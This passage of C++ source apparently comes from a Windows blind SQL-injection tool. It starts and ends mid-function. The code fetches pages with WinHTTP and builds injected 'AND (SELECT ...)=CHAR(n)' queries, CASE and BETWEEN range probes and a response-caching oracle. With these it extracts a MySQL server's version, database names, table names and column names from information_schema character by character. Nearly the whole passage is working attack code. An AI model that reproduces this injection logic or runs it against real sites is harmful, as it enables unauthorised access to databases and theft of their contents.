		char* old = new char[bufLen+1];
		memset(old, 0, bufLen+1);
		memcpy(old, buffer, bufLen);
		if (buffer)
		{
			delete[] buffer;
			buffer = 0;
		}
		buffer = new char[bufLen+bRecv+1];
		memset(buffer, 0, bufLen+bRecv+1);
		memcpy(buffer, old, bufLen);
		delete[] old;
		old = 0;

		char* bufRecv = new char[bRecv+1];
		memset(bufRecv, 0, bRecv+1);
		if (!WinHttpReadData(hRequest, bufRecv, bRecv, &bRead)) this->error = _T("error in http read data");
		memcpy(buffer+bufLen, bufRecv, bRead);
		delete[] bufRecv;
		bufLen = bufLen + bRead;
	} while (bRecv > 0);
	if (!buffer || !bufLen)
	{
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		delete[] buffer;
		this->error = _T("failed to get http data");
		return 0;
	}
	if (!encoding && this->getEncodingFromMetaData(buffer, bufLen, hdrBuf, 1024)) encoding = hdrBuf;
	TCHAR* data = this->convert_http_data(buffer, bufLen, encoding);
	delete[] buffer;
	if (!data) return 0;
	if (this->dynamic_start && this->dynamic_end) this->removeDynamicContent(data, bufLen);
	this->log(4, _T("[*] RECV: %s"), data);
	this->requests += 1;
	Sleep(this->interval);
	// Cleanup
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
	return data;
}

TCHAR* CFramework::convert_http_data(char* data, unsigned long len, TCHAR* encoding)
{
	TCHAR* utf16 = new TCHAR[len+1];
	memset(utf16, 0, len*sizeof(TCHAR)+sizeof(TCHAR));
	if (!encoding)
	{
		// Unknown encoding
		size_t count = 0;
		if (mbstowcs_s(&count, utf16, len+1, data, len) || !count)
		{
			delete[] utf16;
			this->error = _T("failed at function mbstowcs_s in convert_http_data");
			return 0;
		}
		return utf16;
	}
	for (unsigned int i=0; i<sizeof(codepages)/sizeof(CODEPAGES); i++)
	{
		if (!_tcsicmp(encoding, codepages[i].netname))
		{
			this->log(4, _T("[*] Converting received data from %s to UTF16"), codepages[i].netname);
			if (!MultiByteToWideChar(codepages[i].identifier, 0, data, len, utf16, len+1))
			{
				delete[] utf16;
				this->error = _T("failed at function multibytetowidechar in convert_http_data");
				return 0;
			}
			return utf16;
		}
	}
	this->error = _T("encoding not found in codepages list");
	delete[] utf16;
	return 0;
}

bool CFramework::getEncodingFromMetaData(char* page, unsigned long len, TCHAR* buffer, unsigned long buflen)
{
	if (!page || !len || !buffer || !buflen) return false;
	char* start = strstr(page, "<meta");
	if (!start) return false;
	char* end = strstr(start, "<title>");
	if (!end) return false;
	char* encoding = strstr(start, "charset=");
	if ((!encoding) && (encoding > end)) return false;
	if (encoding) encoding+=8;
	char* cbuf = new char[len+1];
	memset(cbuf, 0, len+1);
	for (unsigned int i=0; (encoding[i] != '"') && (encoding[i] != ' ') && (i<buflen); i++)
		cbuf[i] = encoding[i];
	size_t size = mbstowcs_s(&size, buffer, buflen, cbuf, strlen(cbuf));
	delete[] cbuf;
	return (!size ? true : false);
}

void CFramework::removeDynamicContent(TCHAR* page, unsigned long len)
{
	TCHAR* startpos = _tcsstr(page, this->dynamic_start);													// Points to the first char
	if (!startpos) return;																										// String not found
	TCHAR* endpos = _tcsstr(startpos, this->dynamic_end) + _tcslen(this->dynamic_end);	// Points to the char after the last char
	if (!endpos) return;																										// Endpos not found
	unsigned startlen = len - _tcslen(startpos);
	unsigned long endlen = _tcslen(endpos);
	memmove(startpos, endpos, endlen*sizeof(TCHAR));
	memset(startpos+endlen, 0, (len-startlen-endlen)*sizeof(TCHAR));
}

void CFramework::show_cache_list()
{
	if (!this->cache_pages_count)
	{
		this->log(0, _T("[-] No page(s) in cache"));
		return;
	}
	this->log(2, _T("page[index][id]index[num]needle[string]char[chr]"));
	for (unsigned int i=0; i<this->cache_pages_count; i++)
	{
		PCACHELIST cpage = this->cache_list[i];
		unsigned long rpage = cpage->page;
		TCHAR chr = cpage->chr;
		unsigned long needles = cpage->real_needles_count;
		for (unsigned long x=0; x<needles; x++)
			this->log(2, _T("cached[%d]page[%d]index[%d]needle[%s]char[%c]"), i, rpage, x, cpage->real_needles[x]->needle, chr);
	}
}

bool CFramework::create_cache_list()
{
	unsigned long len = 0;
	unsigned long start = GetTickCount();
	unsigned long cpages = this->cache_pages_count;
	unsigned long max_not_found_pages = 20;
	PCACHELIST* cache_tmp_list = 0;
	if (this->cache_list)
	{
		unsigned long pages = this->charlen - cpages;
		if (pages < 1)
		{
			this->log(1, _T("[*] Nothing extra to cache"));
			return true;
		}
		this->log(1, _T("[*] Caching %d extra page(s)"), pages);
		/*
			set this->cache_list size to new size;
			create tmp storage and copy current cache_list to it
			delete old cache_list and reallocte with bigger size
			copy tmp storage to new cache_list and delete tmp
		*/
		len = cpages+1;
		PCACHELIST* tmp = new PCACHELIST[len];
		memset(tmp, 0, len*sizeof(PCACHELIST));
		memcpy(tmp, this->cache_list, cpages*sizeof(PCACHELIST));
		delete[] this->cache_list;

		len = cpages+pages+1;
		this->cache_list = new PCACHELIST[len];
		memset(this->cache_list, 0, len*sizeof(PCACHELIST));
		memcpy(this->cache_list, tmp, cpages*sizeof(PCACHELIST));
		delete[] tmp;
		len = pages*max_not_found_pages+1;
		cache_tmp_list = new PCACHELIST[len];
		memset(cache_tmp_list, 0, len*sizeof(PCACHELIST));
	}
	else
	{
		len = this->charlen*max_not_found_pages+1;
		this->cache_list = new PCACHELIST[len];
		memset(this->cache_list, 0, len*sizeof(PCACHELIST));

		cache_tmp_list = new PCACHELIST[len];
		memset(cache_tmp_list, 0, len*sizeof(PCACHELIST));
	}
	unsigned long total_tmp_pages = 0;
	unsigned long total_tmp_needles = 0;
	unsigned long fpages = cpages;
	unsigned long not_found_pages = 0;
	unsigned long pagenum = this->cache_start;
	this->log(1, _T("[*] Creating cache list, please wait..."));
	while (true)
	{
		if (pagenum == this->cache_max_pages)
		{
			this->log(1, _T("[*] Reached page %d - stopping with caching"), pagenum);
			break;
		}
		else if (fpages == this->charlen)
		{
			this->log(1, _T("[+] Found %d characters of total %d - done"), fpages, this->charlen);
			break;
		}
		else if (not_found_pages == max_not_found_pages)
		{
			this->log(1, _T("[-] Found %d pages in a row without results, stopping"), not_found_pages);
			break;
		}
		for (unsigned long i=0; i<total_tmp_pages; i++)
		{
			if (cache_tmp_list[i]->page == pagenum)
			{
				i = 0;
				pagenum++;
			}
		}
		len = _tcslen(this->path)+100+_tcslen(this->rest)+1;
		TCHAR* qry = new TCHAR[len];
		memset(qry, 0, len*sizeof(TCHAR));
		_stprintf_s(qry, len, _T("%s%d%s"), this->path, pagenum, this->rest);
		TCHAR* data = this->http_send(qry);
		delete[] qry;
		if (!data) return false;

		//$data = preg_replace("/[\r|\t|\n]+/", " ", $data);
		cache_tmp_list[total_tmp_pages] = new CACHELIST;
		PCACHELIST curpagecache = cache_tmp_list[total_tmp_pages];
		memset(curpagecache, 0, sizeof(CACHELIST));
		len = _tcslen(data)+1;
		curpagecache->data = new TCHAR[len];
		memset(curpagecache->data, 0, len*sizeof(TCHAR));
		_tcscpy_s(curpagecache->data, len, data);
		delete[] data;
		data = curpagecache->data;
		curpagecache->chr = this->charset[fpages];
		curpagecache->page = pagenum;
		curpagecache->index = total_tmp_pages;
		curpagecache->page = pagenum;
		curpagecache->data_needles = new PNEEDLES[len];
		curpagecache->real_needles = new PNEEDLES[len];
		memset(curpagecache->data_needles, 0, len*sizeof(PNEEDLES));
		memset(curpagecache->real_needles, 0, len*sizeof(PNEEDLES));
		curpagecache->data_needles_count = this->fill_needle_list(data, len-1, curpagecache->data_needles);
		curpagecache->real_needles_count = 0;
		unsigned int nindex = 0;
		PNEEDLES* strings = curpagecache->data_needles;
		this->log(2, _T("[*] cached page[%d] in cache_index[%d]"), pagenum, total_tmp_pages);
		for (unsigned int a=0; a<curpagecache->data_needles_count; a++)
		{
			TCHAR* needle = strings[a]->needle;
			this->log(3, _T("[*]\ttrying to find page[%d]index[%d]needle[%s] in cached pages"), pagenum, a, needle);
			bool unique = true;
			for (unsigned int b=0; b<total_tmp_pages; b++)
			{
				PCACHELIST cached = cache_tmp_list[b];
				if (cached->page == curpagecache->page) continue;
				TCHAR* data2 = cached->data;
				PNEEDLES* strings2 = cached->data_needles;
				this->log(4, _T("\t\ttrying cached_page[%d]cached_index[%d]needles[%d]cached_data[%s]"), cached->page, b, cached->data_needles_count, data2);
				for (unsigned int c=0; c<cached->data_needles_count; c++)
				{
					TCHAR* needle2 = strings2[c]->needle;
					this->log(4, _T("\t\t\tcached_page[%d]cached_index[%d]needle_index[%d]needle[%s]"), cached->page, b, c, needle2);
					if (!_tcscmp(needle2, needle))
					{
						/*
							We found the same data_needle in a different cached page.
						*/
						unique = false;
						for (unsigned int d=0; d<cached->real_needles_count; d++)
						{
							/*
								Check if the needle has been added to the unique needle list of the same cached page.
								If so, remove it and re-index the array list of unique needles.
							*/
							if (!_tcscmp(needle2, cached->real_needles[d]->needle))
							{
								delete[] cached->real_needles[d]->needle;
								delete cached->real_needles[d];
								for (; d+1<cached->real_needles_count; d++) cached->real_needles[d] = cached->real_needles[d+1];
								cached->real_needles_count--;
								if (!cached->real_needles_count)
								{
									fpages--;
									this->log(2, _T("all needles deleted from cached_page[%d]cached_index[%d]char[%c]"), cached->page, cached->index, cached->chr);
								}
								total_tmp_needles--;
								break;
							}
						}
						this->log(4, _T("\t\t\t\tfound same needle[%s] and needle2[%s] -- removed"), needle, needle2);
					}		// If the needles are the same
					if (!unique) break;
				}			// Cached page data needles count
				if (!unique) break;
			}				// Cached tmp pages count
			if (unique)
			{
				/*
					Unique needle found, check if we already have the same needle in our cache list.
					If we don't, add it, else skip it.
				*/
				bool already_in_cache = false;
				for (unsigned int i=0; i<curpagecache->real_needles_count; i++)
				{
					if (!_tcscmp(curpagecache->real_needles[i]->needle, needle))
					{
						already_in_cache = true;
						break;
					}
				}
				if (!already_in_cache)
				{
					this->log(3, _T("found unique needle_index[%d]needle[%s] for page[%d]cache_index[%d]"), nindex, needle, curpagecache->page, total_tmp_pages);
					curpagecache->real_needles[nindex] = new NEEDLES;
					len = _tcslen(needle)+1;
					curpagecache->real_needles[nindex]->needle = new TCHAR[len];
					memset(curpagecache->real_needles[nindex]->needle, 0, len*sizeof(TCHAR));
					_tcscpy_s(curpagecache->real_needles[nindex++]->needle, len, needle);
					curpagecache->real_needles_count++;
					total_tmp_needles++;
				}			// If we have the needle not in cache
			}				// If the needle is unique
		}					// Current page data needles count
		if (nindex)
		{
			/*
				We have found atleast one needle that didn't appear in any other cached pages.
			*/
			this->log(2, _T("found needles[%d] for page[%d]cache_index[%d]char[%c] of total length[%d/%d]"), curpagecache->real_needles_count, pagenum, total_tmp_pages, curpagecache->chr, ++fpages, this->charlen);
			if (not_found_pages > 0)
				not_found_pages--;
			else
				not_found_pages = 0;
		}
		else
		{
			/*
				No unique needle found. Increase the counter for not found pages in a row.
			*/
			this->log(2, _T("no needles found for page[%d]cache_index[%d]char[%c]"), curpagecache->page, total_tmp_pages, this->charset[fpages]);
			not_found_pages++;
		}					// If we found a unique needle
		total_tmp_pages++;
	}						// While we not have enough pages with unique needles in cache yet
	/*
		Fill real cache list.
	*/
	for (unsigned long pi=0; pi<total_tmp_pages; pi++)
	{
		PCACHELIST page = cache_tmp_list[pi];
		if (page->real_needles_count)
		{
			unsigned long index = this->cache_pages_count;
			this->cache_list[index] = new CACHELIST;
			PCACHELIST cptr = this->cache_list[index];
			memset(cptr, 0, sizeof(CACHELIST));
			cptr->chr = this->charset[index];
			cptr->page = page->page;
			cptr->real_needles_count = page->real_needles_count;
			len = page->real_needles_count+1;
			cptr->real_needles = new PNEEDLES[len];
			memset(cptr->real_needles, 0, len*sizeof(PNEEDLES));
			for (unsigned int i=0; i<page->real_needles_count; i++)
			{
				TCHAR* needle = page->real_needles[i]->needle;
				cptr->real_needles[i] = new NEEDLES;
				memset(cptr->real_needles[i], 0, sizeof(NEEDLES));
				len = _tcslen(needle)+1;
				cptr->real_needles[i]->needle = new TCHAR[len];
				memset(cptr->real_needles[i]->needle, 0, len*sizeof(TCHAR));
				_tcscpy_s(cptr->real_needles[i]->needle, len, needle);
				this->cache_needles_count++;
			}
			this->cache_pages_count++;
		}
	}
	/*
		Free/delete memory used for cache_tmp_list
	*/
	for (unsigned int a=0; a<total_tmp_pages; a++)
	{
		for (unsigned int b=0; b<cache_tmp_list[a]->data_needles_count; b++)
		{
			delete[] cache_tmp_list[a]->data_needles[b]->needle;
			delete cache_tmp_list[a]->data_needles[b];
		}
		for (unsigned int b=0; b<cache_tmp_list[a]->real_needles_count; b++)
		{
			delete[] cache_tmp_list[a]->real_needles[b]->needle;
			delete cache_tmp_list[a]->real_needles[b];
		}
		delete[] cache_tmp_list[a]->data;
		delete cache_tmp_list[a];
	}
	delete[] cache_tmp_list;
	unsigned long end = GetTickCount();
	unsigned long length = this->cache_pages_count;
	unsigned long total = this->cache_needles_count;
	if (length)
	{
		//this->log(2, _T("[*] Cache overview:"));
		//this->show_cache_list();
	}
	this->log(1, _T("[*] Total pages requested: %d"), total_tmp_pages);
	this->log(1, _T("[*] Total amount of needles found: %d"), total_tmp_needles);
	this->log(1, _T("[*] Amount of pages in cache: %d"), length);
	this->log(1, _T("[*] Amount of needles in cache: %d"), total);
	this->log(1, _T("[*] Average needles per character: %d"), (length ? total/length : 0));
	this->log(0, _T("[*] Generated %d request(s)"), this->requests);
	this->log(0, _T("[*] Caching done, took %d second(s)"), (end-start)/1000);
	return true;
}

unsigned int CFramework::fill_needle_list(TCHAR* data, unsigned int len, PNEEDLES* needles)
{
	unsigned int index = 0, stringlen = 0;
	TCHAR* tmp = new TCHAR[len+1];
	memset(tmp, 0, len*sizeof(TCHAR)+sizeof(TCHAR));
	memcpy(tmp, data, len*sizeof(TCHAR));
	TCHAR* context = 0;
	TCHAR delims[] = _T(" \t\r\n");
	TCHAR* token = _tcstok_s(tmp, delims, &context);
	while (token)
	{
		needles[index] = new NEEDLES;
		memset(needles[index], 0, sizeof(NEEDLES));
		stringlen = _tcslen(token);
		needles[index]->length = stringlen;
		needles[index]->needle = new TCHAR[stringlen+1];
		memset(needles[index]->needle, 0, stringlen*sizeof(TCHAR)+sizeof(TCHAR));
		_tcscpy_s(needles[index]->needle, stringlen+1, token);
		index++;
		token = _tcstok_s(0, delims, &context);
	}
	delete[] tmp;
	return index;
}

TCHAR CFramework::search_cache_list(TCHAR* page)
{
	PCACHEHITS* cachehits = new PCACHEHITS[this->cache_pages_count+1];
	memset(cachehits, 0, (this->cache_pages_count+1)*sizeof(CACHEHITS**));

	int total_hits = -1;
	unsigned int ncount = _tcslen(page)+1;
	PNEEDLES* tpage = new PNEEDLES[ncount];
	memset(tpage, 0, ncount*sizeof(PNEEDLES));
	ncount = this->fill_needle_list(page, ncount-1, tpage);
	this->log(3, _T("[*] Target page: %s"), page);
	for (unsigned int a=0; a<ncount; a++)
	{
		PNEEDLES tneedle = tpage[a];
		this->log(3, _T("[*] Looking for needle[%s] in cache list"), tneedle->needle);
		for (unsigned int i=0; i<this->cache_pages_count; i++)
		{
			unsigned long crpage = this->cache_list[i]->page;
			TCHAR cchar = this->cache_list[i]->chr;
			if (!cachehits[i]) cachehits[i] = new CACHEHITS;
			cachehits[i]->pagechar = this->cache_list[i]->chr;
			for (unsigned int x=0; x<this->cache_list[i]->real_needles_count; x++)
			{
				PNEEDLES needle = this->cache_list[i]->real_needles[x];
				this->log(4, _T("[*] Comparing cached[%d]page[%d]index[%d]needle[%s]char[%c]"), i, crpage, x, needle->needle, cchar);
				if (!_tcscmp(needle->needle, tneedle->needle))
				{
					this->log(3, _T("[*] Found index[%d]needle[%s] in cached[%d]page[%d]index[%d]needle[%s]char[%c/%d]"), a, tneedle->needle, i, crpage, x, needle->needle, cchar, i+1);
					cachehits[i]->needlesfound++;
					total_hits++;
				}
			}
		}
	}
	for (unsigned int i=0; i<ncount; i++)
	{
		delete[] tpage[i]->needle;
		delete tpage[i];
	}
	delete[] tpage;
	if (total_hits == -1)
	{
			this->log(0, "[-] Result not found in cache, try other method or increase charset length");
			return 0;
	}
	/*
		Check for amount of hits we have in the cache list for current page.
		The cached page that has the most needle hits found is likely the correct page.
	*/
	TCHAR chr = 0;
	unsigned long mostNeedles = 0;
	for (int i=0; cachehits[i]; i++)
	{
		this->log(3, _T("[*] Found %d matching needles for cache index %d"), cachehits[i]->needlesfound, i);
		if (cachehits[i]->needlesfound > mostNeedles)
		{
			mostNeedles = cachehits[i]->needlesfound;
			chr = cachehits[i]->pagechar;
		}
	}
	for (int i=0; cachehits[i]; i++) delete cachehits[i];
	delete[] cachehits;
	return chr;
}

TCHAR CFramework::get_brute_result(TCHAR* sub_qry, bool use_charset , unsigned short start, unsigned short end)
{
	size_t size = 1024+_tcslen(sub_qry)+_tcslen(this->space)*2+1;
	TCHAR* qry = new TCHAR[size];
	for (unsigned short i=start; i<=end; i++)
	{
		memset(qry, 0, size*sizeof(TCHAR));
		if (use_charset)
		{
			if (i > this->charlen) break;
			TCHAR chr = this->charset[i];
			_stprintf_s(qry, size, _T("%sAND%s(SELECT(%s)=CHAR(%d))%s"), this->space, this->space, sub_qry, chr, this->end);
			this->log(2, "[*] Trying %d (%c)", i, chr);
		}
		else
		{
			_stprintf_s(qry, size, _T("%sAND%s(SELECT(%s)=%d)%s"), this->space, this->space, sub_qry, i, this->end);
			this->log(2, "[*] Trying %d", i);
		}
		if (this->query_send(qry))
		{
			delete[] qry;
			return (use_charset ? this->charset[i] : i);
		}
	}
	delete[] qry;
	return RESULT_NOT_FOUND;
}

TCHAR CFramework::get_smart_result(TCHAR* sub_qry, bool use_charset = false, unsigned short gap = 5, unsigned short max = 5000)
{
	unsigned short _max=max/gap, start=0, end=0;
	TCHAR schar=0, echar=0;
	size_t len = 1024+_tcslen(this->space)*4+_tcslen(sub_qry);
	TCHAR* buffer = new TCHAR[len];
	for (unsigned short x=0; x<=_max; x++)
	{
		start = x*gap;
		end = start+gap-1;
		memset(buffer, 0, len*sizeof(TCHAR));
		if (use_charset)
		{
			if (start > this->charlen)
				break;
			else if (end > this->charlen)
				end = this->charlen-1;

			schar = this->charset[start];
			echar = this->charset[end];
			_stprintf_s(buffer, len, _T("%sAND%s(SELECT%sCASE%s(%s)"), this->space, this->space, this->space, this->space, sub_qry);
			for (unsigned int i=0; i<gap; i++) _stprintf_s(buffer, len, _T("%s%sWHEN%sCHAR(%d)%sTHEN%s1"), buffer, this->space, this->space, this->charset[start+i], this->space, this->space);
			_tcscat_s(buffer, len, this->space);
			_tcscat_s(buffer, len, _T("ELSE"));
			_tcscat_s(buffer, len, this->space);
			_tcscat_s(buffer, len, _T("0"));
			_tcscat_s(buffer, len, this->space);
			_tcscat_s(buffer, len, _T("END)"));
			this->log(2, _T("[*] Trying range[%d]: %c (%d) - %c (%d)"), x, schar, start, echar, end);
		}
		else
		{
			_stprintf_s(buffer, len, _T("%sAND%s(SELECT(%s)%sBETWEEN%s%d%sAND%s%d)%s"), this->space, this->space, sub_qry, this->space, this->space, start, this->space, this->space, end, this->end);
			this->log(2, _T("[*] Trying range[%d]: %d - %d"), x, start, end);
		}
		if (this->query_send(buffer))
		{
			delete[] buffer;
			this->log(2, "[*] in range!");
			return this->get_brute_result(sub_qry, use_charset, start, end);
		}
	}
	delete[] buffer;
	return RESULT_NOT_FOUND;
}

TCHAR CFramework::get_cache_result(TCHAR* qry, bool use_charset = false)
{
	unsigned long start = this->cache_start;
	size_t len = 1024*this->charlen+_tcslen(qry)+1;
	TCHAR* tmp = new TCHAR[len];
	memset(tmp, 0, len*sizeof(TCHAR));
	TCHAR* buffer = new TCHAR[len];
	memset(buffer, 0, len*sizeof(TCHAR));
	_stprintf_s(buffer, len, _T("(SELECT%sCASE%s(%s)"), this->space, this->space, qry);
	for (unsigned long i=0; i<this->charlen; i++)
	{
		unsigned long page = this->cache_list[i]->page;
		if (use_charset)
			_stprintf_s(tmp, len, _T("%sWHEN%sCHAR(%d)%sTHEN%s%d"), this->space, this->space, this->cache_list[i]->chr, this->space, this->space, page);
		else
			_stprintf_s(tmp, len, _T("%sWHEN%s%d%sTHEN%s%d"), this->space, this->space, i, this->space, this->space, page);
		_tcscat_s(buffer, len, tmp);
	}
	_tcscat_s(buffer, len, this->space);
	_tcscat_s(buffer, len, _T("END)"));
	TCHAR chr = this->query_send(buffer);
	delete[] buffer;
	delete[] tmp;
	if (!chr) return RESULT_NOT_FOUND;
	if (!use_charset)
	{
		unsigned int index = 0;
		while (this->charset[index] != chr) index++;
		return (TCHAR)index;
	}
	return chr;
}

TCHAR CFramework::get_result(TCHAR* qry, bool use_charset = false, unsigned short param1 = 0, unsigned short param2 = 0)
{
	switch (this->method)
	{
	case METHOD_BRUTEFORCE:
		return this->get_brute_result(qry, use_charset, param1, (param2 ? param2 : 1000));

	case METHOD_BRUTEFORCE_SMART:
		return this->get_smart_result(qry, use_charset, (param1 ? param1 : 5), (param2 ? param2 : 500));

	case METHOD_CACHING:
		return this->get_cache_result(qry, use_charset);

	default:
		return 0;
	}
}

unsigned long CFramework::getDatabaseVersion()
{
	HOST* host = this->history.addHost(this->host);
	if (host->version && (host->version != RESULT_NOT_FOUND)) return host->version;
	this->log(2, _T("[*] Bruteforcing database version"));
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	_stprintf_s(qry, len, _T("SELECT%sSUBSTRING((SELECT%sversion()),1,1)"), this->space, this->space);
	TCHAR result = this->get_result(qry);
	delete[] qry;
	return (host->version = result);
}

unsigned long CFramework::getDatabaseCount()
{
	HOST* host = this->history.addHost(this->host);
	if (host->databasecount && (host->databasecount != RESULT_NOT_FOUND)) return host->databasecount;
	this->log(2, _T("[*] Bruteforcing amount of databases"));
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	_stprintf_s(qry, len, _T("SELECT%sCOUNT(SCHEMA_NAME)%sFROM%sinformation_schema.SCHEMATA"), this->space, this->space, this->space);
	TCHAR result = this->get_result(qry);
	delete[] qry;
	return (host->databasecount = result);
}

unsigned long CFramework::getDatabaseNameLength(unsigned long id)
{
	if (this->history.getDatabase(this->host, id)) return _tcslen(this->history.getDatabase(this->host, id)->name);
	this->log(2, _T("[*] Bruteforcing database name length for database index %d"), id);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	_stprintf_s(qry, len, _T("SELECT%sLENGTH(SCHEMA_NAME)%sFROM%sinformation_schema.SCHEMATA%sLIMIT%s%d,1"), this->space, this->space, this->space, this->space, this->space, id-1);
	TCHAR result = this->get_result(qry);
	delete[] qry;
	return result;
}

TCHAR* CFramework::getDatabaseName(unsigned long id, unsigned long length)
{
	if (!length) return 0;
	if (this->history.getDatabase(this->host, id)) return this->history.getDatabase(this->host, id)->name;
	TCHAR* dbname = new TCHAR[length+1];
	memset(dbname, 0, (length+1)*sizeof(TCHAR));
	this->log(2, _T("[*] Bruteforcing database name for database index %d with length %d"), id, length);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	for (unsigned long i=1; i<=length; i++)
	{
		this->log(3, _T("[*] Getting database name character at index %d of length %d for database id %d"), i, length, id);
		_stprintf_s(qry, len, _T("SELECT%ssubstr((SELECT%sSCHEMA_NAME%sFROM%sinformation_schema.SCHEMATA%sLIMIT%s%d,1),%d,1)"), this->space, this->space, this->space, this->space, this->space, this->space, id-1, i);
		TCHAR result = this->get_result(qry, true);
		if (result != RESULT_NOT_FOUND)
		{
			this->log(2, _T("[+] Found database name character %c for index %d of length %d"), result, i, length);
			dbname[i-1] = result;
		}
		else
		{
			this->log(2, _T("[-] Database name character for index %d of length %d not found"), i, length);
			dbname[i-1] = _T('?');
		}
	}
	delete[] qry;
	DATABASE* d = this->history.addDatabase(this->host, dbname);
	delete[] dbname;
	if (!d) return 0;
	d->index = id;
	return d->name;
}

unsigned long CFramework::getTableCount(TCHAR* dbname)
{
	if (!_tcsicmp(dbname, _T("information_schema")) || !_tcsicmp(dbname, _T("mysql"))) return 0;		// Not needed to find (information_schema info CANT be searched for info on itself)?
	DATABASE* db = this->history.addDatabase(this->host, dbname);
	if (db->tablecount && (db->tablecount != RESULT_NOT_FOUND)) return db->tablecount;
	this->log(2, _T("[*] Bruteforcing amount of tables in database '%s'"), dbname);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	_stprintf_s(qry, len, _T("SELECT%sCOUNT(TABLE_NAME)%sFROM%sinformation_schema.TABLES%sWHERE%sTABLE_SCHEMA=CONCAT("), this->space, this->space, this->space, this->space, this->space);
	for (unsigned int i=0; i<_tcslen(dbname); i++)
	{
		if (i) _stprintf_s(qry, len, _T("%s,"), qry);
		_stprintf_s(qry, len, _T("%sCHAR(%d)"), qry, dbname[i]);
	}
	_stprintf_s(qry, len, _T("%s)%sAND%sTABLE_ROWS%sIS%sNOT%sNULL"), qry, this->space, this->space, this->space, this->space, this->space);
	TCHAR result = this->get_result(qry);
	delete[] qry;
	return (db->tablecount = result);
}

unsigned long CFramework::getTableNameLength(TCHAR* dbname, unsigned long id)
{
	if (this->history.getTable(this->host, dbname, id)) return _tcslen(this->history.getTable(this->host, dbname, id)->name);
	this->log(2, _T("[*] Bruteforcing table name length for table index %d in database '%s'"), id, dbname);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	_stprintf_s(qry, len, _T("SELECT%sLENGTH(TABLE_NAME)%sFROM%sinformation_schema.TABLES%sWHERE%sTABLE_SCHEMA=CONCAT("), this->space, this->space, this->space, this->space, this->space);
	for (unsigned int i=0; i<_tcslen(dbname); i++)
	{
		if (i) _stprintf_s(qry, len, _T("%s,"), qry);
		_stprintf_s(qry, len, _T("%sCHAR(%d)"), qry, dbname[i]);
	}
	_stprintf_s(qry, len, _T("%s)%sAND%sTABLE_ROWS%sIS%sNOT%sNULL%sLIMIT%s%d,1"), qry, this->space, this->space, this->space, this->space, this->space, this->space, this->space, id-1);
	TCHAR result = this->get_result(qry);
	delete[] qry;
	return result;
}

TCHAR* CFramework::getTableName(TCHAR* dbname, unsigned long id, unsigned long length)
{
	if (this->history.getTable(this->host, dbname, id)) return this->history.getTable(this->host, dbname, id)->name;
	TCHAR* tablename = new TCHAR[length+1];
	memset(tablename, 0, (length+1)*sizeof(TCHAR));
	this->log(2, _T("[*] Bruteforcing table name for table index %d with length %d in database '%s'"), id, length, dbname);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	for (unsigned long i=1; i<=length; i++)
	{
		this->log(3, _T("[*] Getting table name character at index %d of length %d for table id %d"), i, length, id);
		_stprintf_s(qry, len, _T("SELECT%ssubstr((SELECT%sTABLE_NAME%sFROM%sinformation_schema.TABLES%sWHERE%sTABLE_SCHEMA=CONCAT("), this->space, this->space, this->space, this->space, this->space, this->space);
		for (unsigned int a=0; a<_tcslen(dbname); a++)
		{
			if (a) _stprintf_s(qry, len, _T("%s,"), qry);
			_stprintf_s(qry, len, _T("%sCHAR(%d)"), qry, dbname[a]);
		}
		_stprintf_s(qry, len, _T("%s)%sAND%sTABLE_ROWS%sIS%sNOT%sNULL%sLIMIT%s%d,1),%d,1)"), qry, this->space, this->space, this->space, this->space, this->space, this->space, this->space, id-1, i);
		TCHAR result = this->get_result(qry, true);
		if (result != RESULT_NOT_FOUND)
		{
			this->log(2, _T("[+] Found table name character %c for index %d of length %d"), result, i, length);
			tablename[i-1] = result;
		}
		else
		{
			this->log(2, _T("[-] Table name character for index %d of length %d not found"), i, length);
			tablename[i-1] = _T('?');
		}
	}
	delete[] qry;
	TABLE* t = this->history.addTable(this->host, dbname, tablename);
	delete[] tablename;
	if (!t) return 0;
	t->index = id;
	return t->name;
}

unsigned long CFramework::getColumnCount(TCHAR* dbname, TCHAR* tablename)
{
	TABLE* db = this->history.addTable(this->host, dbname, tablename);
	if (db->columncount && (db->columncount != RESULT_NOT_FOUND)) return db->columncount;
	this->log(2, _T("[*] Bruteforcing amount of columns in table '%s' in database '%s'"), tablename, dbname);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	_stprintf_s(qry, len, _T("SELECT%sCOUNT(COLUMN_NAME)%sFROM%sinformation_schema.COLUMNS%sWHERE%sTABLE_SCHEMA=CONCAT("), this->space, this->space, this->space, this->space, this->space);
	for (unsigned int i=0; i<_tcslen(dbname); i++)
	{
		if (i) _stprintf_s(qry, len, _T("%s,"), qry);
		_stprintf_s(qry, len, _T("%sCHAR(%d)"), qry, dbname[i]);
	}
	_stprintf_s(qry, len, _T("%s)%sAND%sTABLE_NAME=CONCAT("), qry, this->space, this->space);
	for (unsigned int i=0; i<_tcslen(tablename); i++)
	{
		if (i) _stprintf_s(qry, len, _T("%s,"), qry);
		_stprintf_s(qry, len, _T("%sCHAR(%d)"), qry, tablename[i]);
	}
	_stprintf_s(qry, len, _T("%s)"), qry);
	TCHAR result = this->get_result(qry);
	delete[] qry;
	return (db->columncount = 	result);
}

unsigned long CFramework::getColumnNameLength(TCHAR* dbname, TCHAR* tablename, unsigned long id)
{
	if (this->history.getColumn(this->host, dbname, tablename, id)) return _tcslen(this->history.getColumn(this->host, dbname, tablename, id)->name);
